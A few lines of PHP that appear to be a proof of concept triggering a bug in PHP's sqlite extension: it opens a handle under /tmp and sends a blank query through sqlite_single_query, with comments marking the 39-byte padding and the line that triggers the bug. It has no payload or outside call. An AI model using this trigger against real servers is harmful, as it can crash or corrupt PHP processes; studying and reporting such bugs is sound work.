<?php
$dh = sqlite_popen("/tmp/whatever");
str_repeat("A",39); // +1 byte for \x00
$dummy = sqlite_single_query($dh," "); // trigger the bug
?>
